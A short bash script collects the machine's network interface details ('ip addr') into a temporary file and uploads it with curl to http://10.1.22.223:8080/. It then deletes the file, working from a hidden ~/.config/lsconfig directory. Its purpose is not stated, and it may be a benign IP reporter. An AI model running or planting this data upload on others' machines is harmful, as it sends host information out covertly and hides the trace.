#!/bin/bash

cd $HOME/.config/lsconfig

touch /tmp/testfile
ip addr >> /tmp/testfile
curl -F "upfile=@/tmp/testfile" http://10.1.22.223:8080/
rm /tmp/testfile

